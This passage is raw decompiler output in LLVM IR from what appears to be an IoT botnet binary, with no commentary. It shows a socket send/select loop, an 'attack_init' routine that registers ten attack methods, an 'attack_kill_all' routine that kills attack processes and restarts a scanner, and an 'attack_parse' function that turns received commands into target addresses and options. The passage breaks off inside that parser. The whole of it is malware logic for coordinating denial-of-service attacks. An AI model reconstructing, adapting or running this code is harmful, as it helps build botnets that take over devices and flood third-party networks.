  %v4_cc84 = or i1 %v9_cc80, %v3_cc84
  br i1 %v4_cc84, label %dec_label_pc_cd44, label %dec_label_pc_cc88

dec_label_pc_cc88:                                ; preds = %dec_label_pc_cc70
  %v3_cc8c = load i32, i32* %v2_cbec, align 4
  %v3_cc94 = urem i32 %v3_cc8c, 1024
  %v2_cc98 = icmp eq i32 %v3_cc94, 0
  br i1 %v2_cc98, label %dec_label_pc_cca0, label %dec_label_pc_cd44

dec_label_pc_cca0:                                ; preds = %dec_label_pc_cc88
  store i32 %v2_baa4, i32* @lr, align 4
  store i32 0, i32* %szbuf_-10368, align 4
  call void @util_zero(i8* %tmp76, i32 4)
  %v5_cce4 = call i8* @util_itoa(i32 1024, i32 16, i8* %tmp76)
  %v1_ccec = inttoptr i32 %v2_c1a8 to i32*
  %v2_ccec = load i32, i32* %v1_ccec, align 4
  store i32 %v2_ccec, i32* @r4, align 4
  %v3_cd00 = call i32 @util_strlen(i8* %tmp76)
  %v0_cd18 = load i32, i32* @r4, align 4
  %v4_cd24 = call i32 @__libc_send(i32 %v0_cd18, i32 %v2_ccbc, i32 %v3_cd00, i32 16384)
  %v2_cd2c = load i32, i32* %v1_ccec, align 4
  %v5_cd40 = call i32 @__libc_send(i32 %v2_cd2c, i32 ptrtoint ([3 x i8]* @global_var_22df8.41 to i32), i32 2, i32 16384)
  br label %dec_label_pc_cd44

dec_label_pc_cd44:                                ; preds = %dec_label_pc_cc88, %dec_label_pc_cc70, %dec_label_pc_cca0
  %v1_cd48 = inttoptr i32 %v2_c1a8 to i32*
  %v2_cd48 = load i32, i32* %v1_cd48, align 4
  store i32 %v2_cd48, i32* @r4, align 4
  %v3_cd5c = call i32 @util_strlen(i8* %tmp75)
  %v0_cd74 = load i32, i32* @r4, align 4
  %v4_cd80 = call i32 @__libc_send(i32 %v0_cd74, i32 %v2_c4f8, i32 %v3_cd5c, i32 16384)
  %v3_cd90 = icmp eq i32 %v4_cd80, -1
  br i1 %v3_cd90, label %dec_label_pc_cd98, label %dec_label_pc_cda8

dec_label_pc_cd98:                                ; preds = %dec_label_pc_cd44
  store i8 1, i8* %v2_c1b4, align 1
  br label %dec_label_pc_cfb0

dec_label_pc_cda8:                                ; preds = %dec_label_pc_cd44
  %v3_cdb8 = call i32 @util_strlen(i8* %tmp75)
  %v9_cdc4 = icmp eq i32 %v3_cdb8, %v4_cd80
  br i1 %v9_cdc4, label %dec_label_pc_cdd8, label %dec_label_pc_cdcc

dec_label_pc_cdcc:                                ; preds = %dec_label_pc_cda8
  store i8 9, i8* %v2_c1b4, align 1
  br label %dec_label_pc_cdd8

dec_label_pc_cdd8:                                ; preds = %dec_label_pc_cda8, %dec_label_pc_cdcc
  %v3_cddc = load i32, i32* %v2_cbec, align 4
  %v2_cde4 = sub i32 %v3_cddc, %v4_cd80
  store i32 %v2_cde4, i32* %v2_cbec, align 4
  %v2_cdf4 = load i32, i32* %v1_cd48, align 4
  %v3_cdf8 = udiv i32 %v2_cdf4, 32
  %v3_ce0c = mul nuw nsw i32 %v3_cdf8, 4
  %v2_ce14 = add i32 %v3_ce0c, %v2_baa4
  %v2_ce18 = add i32 %v2_ce14, -10600
  %v1_ce1c = inttoptr i32 %v2_ce18 to i32*
  %v2_ce1c = load i32, i32* %v1_ce1c, align 4
  %v2_ce24 = load i32, i32* %v1_cd48, align 4
  %v1_ce28 = urem i32 %v2_ce24, 32
  %v6_ce30 = shl i32 1, %v1_ce28
  %v2_ce34 = or i32 %v6_ce30, %v2_ce1c
  store i32 %v2_ce34, i32* %v1_ce1c, align 4
  br label %dec_label_pc_ce54

dec_label_pc_ce54:                                ; preds = %dec_label_pc_cbf8, %dec_label_pc_cdd8
  %v1_ce64.pre-phi = phi i32* [ %v1_cbfc, %dec_label_pc_cbf8 ], [ %v1_cd48, %dec_label_pc_cdd8 ]
  %v2_ce5c = add i32 %v2_c1a8, 12
  %v3_ce5c = inttoptr i32 %v2_ce5c to i32*
  store i32 %v2_c0dc, i32* %v3_ce5c, align 4
  %v2_ce64 = load i32, i32* %v1_ce64.pre-phi, align 4
  %v3_ce68 = udiv i32 %v2_ce64, 32
  %v3_ce7c = mul nuw nsw i32 %v3_ce68, 4
  %v2_ce84 = add i32 %v3_ce7c, %v2_baa4
  %v2_ce88 = add i32 %v2_ce84, -10472
  %v1_ce8c = inttoptr i32 %v2_ce88 to i32*
  %v2_ce8c = load i32, i32* %v1_ce8c, align 4
  %v2_ce94 = load i32, i32* %v1_ce64.pre-phi, align 4
  %v1_ce98 = urem i32 %v2_ce94, 32
  %v6_cea0 = shl i32 1, %v1_ce98
  %v2_cea4 = or i32 %v6_cea0, %v2_ce8c
  store i32 %v2_baa4, i32* @lr, align 4
  store i32 %v2_cea4, i32* %v1_ce8c, align 4
  %v2_cec8 = load i32, i32* %v1_ce64.pre-phi, align 4
  %v2_ced0 = sub i32 %v2_cec8, %nfds_-68.190
  %v4_ced0 = xor i32 %v2_cec8, %nfds_-68.190
  %v5_ced0 = xor i32 %v2_ced0, %v2_cec8
  %v6_ced0 = and i32 %v5_ced0, %v4_ced0
  %v7_ced0 = icmp slt i32 %v6_ced0, 0
  %v8_ced0 = icmp slt i32 %v2_ced0, 0
  %v9_ced0 = icmp eq i32 %v2_cec8, %nfds_-68.190
  %v3_ced4 = xor i1 %v8_ced0, %v7_ced0
  %v4_ced4 = or i1 %v9_ced0, %v3_ced4
  br i1 %v4_ced4, label %dec_label_pc_cfb0, label %dec_label_pc_ced8

dec_label_pc_ced8:                                ; preds = %dec_label_pc_ce54
  %v2_cedc = load i32, i32* %v1_ce64.pre-phi, align 4
  %v1_cee0 = add i32 %v2_cedc, 1
  br label %dec_label_pc_cfb0

dec_label_pc_ceec:                                ; preds = %dec_label_pc_cb74
  %v3_cef0 = load i8, i8* %v2_c1b4, align 1
  %v7_cef4 = icmp eq i8 %v3_cef0, 9
  br i1 %v7_cef4, label %dec_label_pc_cefc, label %dec_label_pc_cf88

dec_label_pc_cefc:                                ; preds = %dec_label_pc_ceec
  %v1_cf00 = inttoptr i32 %v2_c1a8 to i32*
  %v2_cf00 = load i32, i32* %v1_cf00, align 4
  %v3_cf04 = udiv i32 %v2_cf00, 32
  %v3_cf18 = mul nuw nsw i32 %v3_cf04, 4
  %v2_cf20 = add i32 %v3_cf18, %v2_baa4
  %v2_cf24 = add i32 %v2_cf20, -10600
  %v1_cf28 = inttoptr i32 %v2_cf24 to i32*
  %v2_cf28 = load i32, i32* %v1_cf28, align 4
  %v2_cf30 = load i32, i32* %v1_cf00, align 4
  %v1_cf34 = urem i32 %v2_cf30, 32
  %v6_cf3c = shl i32 1, %v1_cf34
  %v2_cf40 = or i32 %v6_cf3c, %v2_cf28
  store i32 %v2_baa4, i32* @lr, align 4
  store i32 %v2_cf40, i32* %v1_cf28, align 4
  %v2_cf64 = load i32, i32* %v1_cf00, align 4
  %v2_cf6c = sub i32 %v2_cf64, %nfds_-68.190
  %v4_cf6c = xor i32 %v2_cf64, %nfds_-68.190
  %v5_cf6c = xor i32 %v2_cf6c, %v2_cf64
  %v6_cf6c = and i32 %v5_cf6c, %v4_cf6c
  %v7_cf6c = icmp slt i32 %v6_cf6c, 0
  %v8_cf6c = icmp slt i32 %v2_cf6c, 0
  %v9_cf6c = icmp eq i32 %v2_cf64, %nfds_-68.190
  %v3_cf70 = xor i1 %v8_cf6c, %v7_cf6c
  %v4_cf70 = or i1 %v9_cf6c, %v3_cf70
  br i1 %v4_cf70, label %dec_label_pc_cfb0, label %dec_label_pc_cf74

dec_label_pc_cf74:                                ; preds = %dec_label_pc_cefc
  %v2_cf78 = load i32, i32* %v1_cf00, align 4
  %v1_cf7c = add i32 %v2_cf78, 1
  br label %dec_label_pc_cfb0

dec_label_pc_cf88:                                ; preds = %dec_label_pc_ceec
  store i8 0, i8* %v2_c1b4, align 1
  %v1_cf98 = inttoptr i32 %v2_c1a8 to i32*
  %v2_cf98 = load i32, i32* %v1_cf98, align 4
  %v1_cfa0 = call i32 @__GI___libc_close(i32 %v2_cf98)
  store i32 -1, i32* %v1_cf98, align 4
  br label %dec_label_pc_cfb0

dec_label_pc_cfb0:                                ; preds = %dec_label_pc_cefc, %dec_label_pc_ce54, %dec_label_pc_c4f0, %dec_label_pc_c454, %dec_label_pc_c264, %dec_label_pc_c238, %dec_label_pc_cf74, %dec_label_pc_ced8, %dec_label_pc_cd98, %dec_label_pc_cb60, %dec_label_pc_c4cc, %dec_label_pc_c428, %dec_label_pc_c3e8, %dec_label_pc_cf88
  %nfds_-68.0 = phi i32 [ %nfds_-68.190, %dec_label_pc_c238 ], [ %nfds_-68.190, %dec_label_pc_c264 ], [ %v1_c3f0, %dec_label_pc_c3e8 ], [ %nfds_-68.190, %dec_label_pc_c454 ], [ %v1_c4d4, %dec_label_pc_c4cc ], [ %nfds_-68.190, %dec_label_pc_c428 ], [ %nfds_-68.190, %dec_label_pc_c4f0 ], [ %v1_cb68, %dec_label_pc_cb60 ], [ %nfds_-68.190, %dec_label_pc_cd98 ], [ %nfds_-68.190, %dec_label_pc_ce54 ], [ %v1_cee0, %dec_label_pc_ced8 ], [ %nfds_-68.190, %dec_label_pc_cefc ], [ %v1_cf7c, %dec_label_pc_cf74 ], [ %nfds_-68.190, %dec_label_pc_cf88 ]
  %v1_cfb4 = add nuw nsw i32 %storemerge1491, 1
  %v5_cfc8 = icmp slt i32 %v1_cfb4, %mfd_-72.0
  br i1 %v5_cfc8, label %dec_label_pc_c17c, label %dec_label_pc_cfcc

dec_label_pc_cfcc:                                ; preds = %dec_label_pc_cfb0, %dec_label_pc_cfbc.preheader
  %nfds_-68.1.lcssa = phi i32 [ 0, %dec_label_pc_cfbc.preheader ], [ %nfds_-68.0, %dec_label_pc_cfb0 ]
  %v2_cfd0 = icmp eq i32 %nfds_-68.1.lcssa, 0
  br i1 %v2_cfd0, label %dec_label_pc_c104.lr.ph, label %dec_label_pc_cfd8

dec_label_pc_cfd8:                                ; preds = %dec_label_pc_cfcc
  store i32 1, i32* %v5_d008, align 8
  %v5_d044 = call i32 @__libc_select(i32 %nfds_-68.1.lcssa, i32 %v2_c0f0, i32 %v2_c134, i32 0, i32 %v3_cfe8)
  %v2_d054 = call i32 @__GI_time(i32* null)
  %tmp79 = icmp slt i32 %v5_d044, 1
  br i1 %tmp79, label %dec_label_pc_c104.lr.ph, label %dec_label_pc_d258.preheader

dec_label_pc_d258.preheader:                      ; preds = %dec_label_pc_cfd8
  br i1 %v5_c0cc108, label %dec_label_pc_d078, label %dec_label_pc_c104.lr.ph

dec_label_pc_d078:                                ; preds = %dec_label_pc_d258.preheader, %dec_label_pc_d24c
  %storemerge15101 = phi i32 [ %v1_d250, %dec_label_pc_d24c ], [ 0, %dec_label_pc_d258.preheader ]
  %v3_d098 = mul i32 %storemerge15101, 668
  %v2_d0a4 = add i32 %v3_d098, %v2_bbcc
  %v1_d0b0 = inttoptr i32 %v2_d0a4 to i32*
  %v2_d0b0 = load i32, i32* %v1_d0b0, align 4
  %v7_d0b4 = icmp eq i32 %v2_d0b0, -1
  br i1 %v7_d0b4, label %dec_label_pc_d24c, label %dec_label_pc_d0bc

dec_label_pc_d0bc:                                ; preds = %dec_label_pc_d078
  %v2_d0c0 = load i32, i32* %v1_d0b0, align 4
  %v3_d0c4 = udiv i32 %v2_d0c0, 32
  %v3_d0d0 = mul nuw nsw i32 %v3_d0c4, 4
  store i32 %v2_baa4, i32* @lr, align 4
  %v2_d0d8 = add i32 %v3_d0d0, %v2_baa4
  %v2_d0dc = add i32 %v2_d0d8, -10600
  %v1_d0e0 = inttoptr i32 %v2_d0dc to i32*
  %v2_d0e0 = load i32, i32* %v1_d0e0, align 4
  %v2_d0e8 = load i32, i32* %v1_d0b0, align 4
  %v1_d0ec = urem i32 %v2_d0e8, 32
  %v6_d0f02 = lshr i32 %v2_d0e0, %v1_d0ec
  %v1_d0f8 = urem i32 %v6_d0f02, 2
  %v2_d0fc = icmp eq i32 %v1_d0f8, 0
  br i1 %v2_d0fc, label %dec_label_pc_d1f8, label %dec_label_pc_d104

dec_label_pc_d104:                                ; preds = %dec_label_pc_d0bc
  %v1_d108 = add i32 %v2_d0a4, 4
  %v2_d108 = inttoptr i32 %v1_d108 to i8*
  %v3_d108 = load i8, i8* %v2_d108, align 1
  %v7_d10c = icmp eq i8 %v3_d108, 2
  br i1 %v7_d10c, label %dec_label_pc_d114, label %dec_label_pc_d1dc

dec_label_pc_d114:                                ; preds = %dec_label_pc_d104
  store i32 0, i32* %sent_-10372, align 4
  store %anon_struct_0* inttoptr (i32 4 to %anon_struct_0*), %anon_struct_0** %__arr_-10376, align 4
  %v2_d140 = load i32, i32* %v1_d0b0, align 4
  store i32 1, i32* @r1, align 4
  %v5_d170 = call i32 @getsockopt(i32 %v2_d140, i32 1, i32 4, i32 %v2_d14c, i32 %v2_d158)
  %v4_d188 = load i32, i32* %sent_-10372, align 4
  %v2_d18c = icmp eq i32 %v4_d188, 0
  br i1 %v2_d18c, label %dec_label_pc_d194, label %dec_label_pc_d1b0

dec_label_pc_d194:                                ; preds = %dec_label_pc_d114
  %v2_d198 = icmp eq i32 %v5_d170, 0
  br i1 %v2_d198, label %dec_label_pc_d1a0, label %dec_label_pc_d1b0

dec_label_pc_d1a0:                                ; preds = %dec_label_pc_d194
  store i8 4, i8* %v2_d108, align 1
  br label %dec_label_pc_d1f8

dec_label_pc_d1b0:                                ; preds = %dec_label_pc_d194, %dec_label_pc_d114
  %v2_d1b4 = load i32, i32* %v1_d0b0, align 4
  %v1_d1bc = call i32 @__GI___libc_close(i32 %v2_d1b4)
  store i32 -1, i32* %v1_d0b0, align 4
  store i8 0, i8* %v2_d108, align 1
  br label %dec_label_pc_d24c

dec_label_pc_d1dc:                                ; preds = %dec_label_pc_d104
  %v3_d1e0 = load i8, i8* %v2_d108, align 1
  %v7_d1e4 = icmp eq i8 %v3_d1e0, 9
  br i1 %v7_d1e4, label %dec_label_pc_d1ec, label %dec_label_pc_d1f8

dec_label_pc_d1ec:                                ; preds = %dec_label_pc_d1dc
  store i8 8, i8* %v2_d108, align 1
  br label %dec_label_pc_d1f8

dec_label_pc_d1f8:                                ; preds = %dec_label_pc_d1dc, %dec_label_pc_d0bc, %dec_label_pc_d1a0, %dec_label_pc_d1ec
  %v2_d1fc = load i32, i32* %v1_d0b0, align 4
  %v3_d200 = udiv i32 %v2_d1fc, 32
  %v3_d20c = mul nuw nsw i32 %v3_d200, 4
  store i32 %v2_baa4, i32* @lr, align 4
  %v2_d214 = add i32 %v3_d20c, %v2_baa4
  %v2_d218 = add i32 %v2_d214, -10472
  %v1_d21c = inttoptr i32 %v2_d218 to i32*
  %v2_d21c = load i32, i32* %v1_d21c, align 4
  %v2_d224 = load i32, i32* %v1_d0b0, align 4
  %v1_d228 = urem i32 %v2_d224, 32
  %v6_d22c3 = lshr i32 %v2_d21c, %v1_d228
  %v1_d234 = urem i32 %v6_d22c3, 2
  %v2_d238 = icmp eq i32 %v1_d234, 0
  br i1 %v2_d238, label %dec_label_pc_d24c, label %dec_label_pc_d240

dec_label_pc_d240:                                ; preds = %dec_label_pc_d1f8
  %v3_d248 = add i32 %v2_d0a4, 4
  %v4_d248 = inttoptr i32 %v3_d248 to i8*
  store i8 1, i8* %v4_d248, align 1
  br label %dec_label_pc_d24c

dec_label_pc_d24c:                                ; preds = %dec_label_pc_d1f8, %dec_label_pc_d078, %dec_label_pc_d1b0, %dec_label_pc_d240
  %v1_d250 = add nuw nsw i32 %storemerge15101, 1
  %v5_d264 = icmp slt i32 %v1_d250, %mfd_-72.0
  br i1 %v5_d264, label %dec_label_pc_d078, label %dec_label_pc_c104.lr.ph

dec_label_pc_d26c:                                ; preds = %dec_label_pc_bb98, %entry
  ret void

; uselistorder directives
  uselistorder i32 %v1_d250, { 1, 0 }
  uselistorder i32* %v1_d0b0, { 3, 4, 0, 1, 2, 5, 6, 7 }
  uselistorder i32 %v2_d0a4, { 1, 0, 2 }
  uselistorder i32 %nfds_-68.1.lcssa, { 1, 0 }
  uselistorder i32 %v1_cfb4, { 1, 0 }
  uselistorder i32 %v2_cf6c, { 1, 0 }
  uselistorder i32 %v2_cf64, { 3, 0, 1, 2 }
  uselistorder i32 %v2_ced0, { 1, 0 }
  uselistorder i32 %v2_cec8, { 3, 0, 1, 2 }
  uselistorder i32* %v1_ce64.pre-phi, { 3, 2, 1, 0 }
  uselistorder i32 %v3_cc74, { 3, 0, 1, 2 }
  uselistorder i32 %v3_cc38, { 3, 0, 1, 2 }
  uselistorder i32* %v2_cbec, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32 %v2_cb58, { 1, 0 }
  uselistorder i32 %v2_cb50, { 3, 0, 1, 2 }
  uselistorder i32 %v2_c4c4, { 1, 0 }
  uselistorder i32 %v2_c4bc, { 3, 0, 1, 2 }
  uselistorder i32 %v2_c3e0, { 1, 0 }
  uselistorder i32 %v2_c3d8, { 3, 0, 1, 2 }
  uselistorder i32* %v1_c21c, { 1, 2, 3, 4, 5, 6, 8, 7, 9, 0, 10 }
  uselistorder i32 %v2_c1a8, { 0, 1, 3, 4, 2, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17 }
  uselistorder i32 %nfds_-68.190, { 18, 17, 14, 11, 10, 7, 6, 3, 0, 16, 23, 15, 13, 22, 12, 9, 21, 8, 5, 20, 4, 2, 19, 1 }
  uselistorder i32 %storemerge1491, { 1, 2, 0 }
  uselistorder i32 %v1_c15c, { 1, 0 }
  uselistorder i32 %v4_c16480, { 1, 0 }
  uselistorder i32 %storemerge1319, { 1, 0 }
  uselistorder i8* %tmp75, { 4, 3, 2, 1, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %v2_c4f8, { 21, 0, 22, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 %v2_c134, { 1, 0 }
  uselistorder i32 %v2_c0f0, { 1, 0 }
  uselistorder i32 %v1_c0b8, { 1, 0 }
  uselistorder i32 %v0_be5c, { 1, 0 }
  uselistorder i32 %v2_bc10, { 4, 3, 2, 1, 0, 5, 6, 7, 8, 9 }
  uselistorder i32 %v3_bc04, { 1, 0 }
  uselistorder i32 %storemerge12109, { 1, 0, 2 }
  uselistorder i32 %mfd_-72.0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_baa4, { 0, 9, 1, 10, 11, 2, 12, 3, 4, 13, 14, 5, 6, 15, 7, 16, 8, 17, 18 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %szbuf_-10368, { 2, 0, 1, 3 }
  uselistorder i32 -10472, { 2, 1, 0 }
  uselistorder i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_22dd0.35, i32 0, i32 0), { 2, 1, 0 }
  uselistorder [3 x i8]* @global_var_22df8.41, { 1, 0 }
  uselistorder i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0), { 0, 1, 2, 3, 4, 5, 6, 15, 16, 18, 19, 17, 20, 21, 22, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 10240, { 0, 3, 4, 1, 5, 2 }
  uselistorder i32 -10600, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 532, { 2, 0, 3, 4, 1 }
  uselistorder i32 668, { 2, 1, 0, 3 }
  uselistorder i32 127, { 0, 1, 3, 4, 2, 5 }
  uselistorder i8 %opts_len, { 1, 0 }
  uselistorder label %dec_label_pc_d24c, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_d1f8, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_d078, { 1, 0 }
  uselistorder label %dec_label_pc_cfb0, { 13, 6, 0, 7, 1, 8, 9, 2, 10, 3, 11, 12, 4, 5 }
  uselistorder label %dec_label_pc_ce54, { 1, 0 }
  uselistorder label %dec_label_pc_cdd8, { 1, 0 }
  uselistorder label %dec_label_pc_cd44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cc70, { 1, 0 }
  uselistorder label %dec_label_pc_c238, { 1, 0 }
  uselistorder label %dec_label_pc_c1cc, { 1, 0 }
  uselistorder label %dec_label_pc_c17c, { 1, 0 }
  uselistorder label %dec_label_pc_c148, { 1, 0 }
  uselistorder label %dec_label_pc_c104, { 1, 0 }
  uselistorder label %dec_label_pc_c104.lr.ph, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_c0b4, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_be5c, { 1, 0 }
  uselistorder label %dec_label_pc_bbe4, { 1, 0 }
  uselistorder label %dec_label_pc_bbc0, { 1, 0 }
}

define i8 @attack_init() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_d27c = load i32, i32* @fp, align 4
  store i32 53892, i32* %stack_var_-4, align 4
  %v2_d280 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d280, i32* @fp, align 4
  call void @add_attack(i8 0, i32 ptrtoint (i32* @global_var_10e30.74 to i32))
  call void @add_attack(i8 1, i32 ptrtoint (i32* @global_var_114ac.76 to i32))
  call void @add_attack(i8 2, i32 ptrtoint (i32* @global_var_11ac0.78 to i32))
  call void @add_attack(i8 9, i32 ptrtoint (i32* @global_var_122a8.80 to i32))
  call void @add_attack(i8 3, i32 ptrtoint (i32* @global_var_eed0.82 to i32))
  call void @add_attack(i8 4, i32 ptrtoint (i32* @global_var_f8f8.84 to i32))
  call void @add_attack(i8 5, i32 ptrtoint (i32* @global_var_10290.86 to i32))
  call void @add_attack(i8 6, i32 56376)
  call void @add_attack(i8 7, i32 ptrtoint (i32* @global_var_e504.89 to i32))
  call void @add_attack(i8 10, i32 33344)
  store i32 %v3_d27c, i32* @fp, align 4
  ret i8 1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder void (i8, i32)* @add_attack, { 9, 8, 0, 7, 6, 5, 4, 3, 2, 1 }
}

define void @attack_kill_all() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 54088, i32* %stack_var_-4, align 4
  %v2_d344 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d344, i32* @fp, align 4
  br label %dec_label_pc_d358

dec_label_pc_d358:                                ; preds = %entry, %dec_label_pc_d384
  %storemerge12 = phi i32 [ 0, %entry ], [ %v1_d398, %dec_label_pc_d384 ]
  %v4_d360 = mul nuw nsw i32 %storemerge12, 4
  %v5_d360 = add i32 %v4_d360, ptrtoint ([8 x i32]* @attack_ongoing to i32)
  %v6_d360 = inttoptr i32 %v5_d360 to i32*
  %v7_d360 = load i32, i32* %v6_d360, align 4
  %v2_d364 = icmp eq i32 %v7_d360, 0
  br i1 %v2_d364, label %dec_label_pc_d384, label %dec_label_pc_d36c

dec_label_pc_d36c:                                ; preds = %dec_label_pc_d358
  %v7_d374 = load i32, i32* %v6_d360, align 4
  %v2_d380 = call i32 @kill(i32 %v7_d374, i32 9)
  br label %dec_label_pc_d384

dec_label_pc_d384:                                ; preds = %dec_label_pc_d358, %dec_label_pc_d36c
  store i32 0, i32* %v6_d360, align 4
  %v1_d398 = add nuw nsw i32 %storemerge12, 1
  %v7_d3a8 = icmp slt i32 %v1_d398, 8
  br i1 %v7_d3a8, label %dec_label_pc_d358, label %dec_label_pc_d3ac

dec_label_pc_d3ac:                                ; preds = %dec_label_pc_d384
  call void @scanner_init()
  ret void

; uselistorder directives
  uselistorder i32* %v6_d360, { 1, 0, 2 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_d384, { 1, 0 }
  uselistorder label %dec_label_pc_d358, { 1, 0 }
}

define void @attack_parse(i8* %buf, i32 %len) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %buf to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp17 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-4 = alloca i32, align 4
  %v3_d3c4 = load i32, i32* @r4, align 4
  %v6_d3c4 = load i32, i32* @fp, align 4
  store i32 54220, i32* %stack_var_-4, align 4
  %v2_d3c8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d3c8, i32* @fp, align 4
  %v0_d3d0 = load i32, i32* %r0.global-to-local, align 4
  %tmp36 = icmp ult i32 %len, 4
  br i1 %tmp36, label %dec_label_pc_d77c, label %dec_label_pc_d3f4

dec_label_pc_d3f4:                                ; preds = %entry
  %v1_d3f8 = inttoptr i32 %v0_d3d0 to i32*
  %v2_d3f8 = load i32, i32* %v1_d3f8, align 4
  store i32 %v2_d3f8, i32* %r0.global-to-local, align 4
  %v1_d400 = call i32 @__GI_ntohl(i32 %v2_d3f8)
  store i32 %v1_d400, i32* %r0.global-to-local, align 4
  %v2_d428 = icmp eq i32 %len, 4
  br i1 %v2_d428, label %dec_label_pc_d77c, label %dec_label_pc_d430

dec_label_pc_d430:                                ; preds = %dec_label_pc_d3f4
  %v1_d410 = add i32 %v0_d3d0, 4
  %v1_d434 = inttoptr i32 %v1_d410 to i8*
  %v2_d434 = load i8, i8* %v1_d434, align 1
  %v2_d458 = icmp eq i32 %len, 5
  br i1 %v2_d458, label %dec_label_pc_d77c, label %dec_label_pc_d460

dec_label_pc_d460:                                ; preds = %dec_label_pc_d430
  %v1_d440 = add i32 %v0_d3d0, 5
  %v1_d464 = inttoptr i32 %v1_d440 to i8*
  %v2_d464 = load i8, i8* %v1_d464, align 1
  %v1_d470 = add i32 %v0_d3d0, 6
  %v1_d47c = add i32 %len, -6
  %v4_d484 = zext i8 %v2_d464 to i32
  %v2_d488 = icmp eq i8 %v2_d464, 0
  br i1 %v2_d488, label %dec_label_pc_d77c, label %dec_label_pc_d490

dec_label_pc_d490:                                ; preds = %dec_label_pc_d460
  %v2_d4a0 = mul nuw nsw i32 %v4_d484, 5
  %v2_d4a4 = sub i32 %v1_d47c, %v2_d4a0
  %v3_d4a4 = icmp ult i32 %v1_d47c, %v2_d4a0
  br i1 %v3_d4a4, label %dec_label_pc_d77c, label %dec_label_pc_d4d0.lr.ph

dec_label_pc_d4d0.lr.ph:                          ; preds = %dec_label_pc_d490
  store i32 %v4_d484, i32* %r0.global-to-local, align 4
  %v2_d4b8 = call i32 @calloc(i32 %v4_d484, i32 24)
  store i32 %v2_d4b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d4d0

dec_label_pc_d4d0:                                ; preds = %dec_label_pc_d4d0.lr.ph, %dec_label_pc_d4d0
  %storemerge213 = phi i32 [ 0, %dec_label_pc_d4d0.lr.ph ], [ %v1_d5ac, %dec_label_pc_d4d0 ]
  %i_-52.012 = phi i32 [ %v1_d470, %dec_label_pc_d4d0.lr.ph ], [ %v1_d530, %dec_label_pc_d4d0 ]
  %v2_d4dc = mul nuw nsw i32 %storemerge213, 24
  %v2_d4e8 = add i32 %v2_d4dc, %v2_d4b8
  %v1_d4f0 = inttoptr i32 %i_-52.012 to i32*
  %v2_d4f0 = load i32, i32* %v1_d4f0, align 4
  %v2_d4f4 = add i32 %v2_d4e8, 16
  %v3_d4f4 = inttoptr i32 %v2_d4f4 to i32*
  store i32 %v2_d4f0, i32* %v3_d4f4, align 4
  %v1_d4fc = add i32 %i_-52.012, 4
  %v1_d524 = inttoptr i32 %v1_d4fc to i8*
  %v2_d524 = load i8, i8* %v1_d524, align 1
  %v3_d528 = add i32 %v2_d4e8, 20
  %v4_d528 = inttoptr i32 %v3_d528 to i8*
  store i8 %v2_d524, i8* %v4_d528, align 1
  %v1_d530 = add i32 %i_-52.012, 5
  %v3_d564 = inttoptr i32 %v2_d4e8 to i16*
  store i16 2, i16* %v3_d564, align 2
  %v3_d5a0 = load i32, i32* %v3_d4f4, align 4
  %v2_d5a4 = add i32 %v2_d4e8, 4
  %v3_d5a4 = inttoptr i32 %v2_d5a4 to i32*
  store i32 %v3_d5a0, i32* %v3_d5a4, align 4
  %v1_d5ac = add nuw nsw i32 %storemerge213, 1
  %v8_d5c0 = icmp sgt i32 %v4_d484, %v1_d5ac
  br i1 %v8_d5c0, label %dec_label_pc_d4d0, label %dec_label_pc_d5c4

dec_label_pc_d5c4:                                ; preds = %dec_label_pc_d4d0
  %tmp34 = add i32 %v2_d4a0, %v0_d3d0
  %v2_d5c8 = icmp eq i32 %v2_d4a4, 0
  br i1 %v2_d5c8, label %dec_label_pc_d77c, label %dec_label_pc_d5d0

dec_label_pc_d5d0:                                ; preds = %dec_label_pc_d5c4
  %tmp35 = add i32 %tmp34, 6
  %v1_d5d4 = inttoptr i32 %tmp35 to i8*
  %v2_d5d4 = load i8, i8* %v1_d5d4, align 1
  %v4_d5f4 = zext i8 %v2_d5d4 to i32
  %v2_d5f8 = icmp eq i8 %v2_d5d4, 0
  br i1 %v2_d5f8, label %dec_label_pc_d740, label %dec_label_pc_d624.lr.ph

dec_label_pc_d624.lr.ph:                          ; preds = %dec_label_pc_d5d0
  store i32 %v4_d5f4, i32* %r0.global-to-local, align 4
  %v2_d60c = call i32 @calloc(i32 %v4_d5f4, i32 8)
  store i32 %v2_d60c, i32* %r0.global-to-local, align 4
  %v1_d5e0 = add i32 %tmp34, 7
  %v1_d5ec = add i32 %v2_d4a4, -1
  br label %dec_label_pc_d624

dec_label_pc_d624:                                ; preds = %dec_label_pc_d624.lr.ph, %dec_label_pc_d6a8
  %storemerge38 = phi i32 [ 0, %dec_label_pc_d624.lr.ph ], [ %v1_d728, %dec_label_pc_d6a8 ]
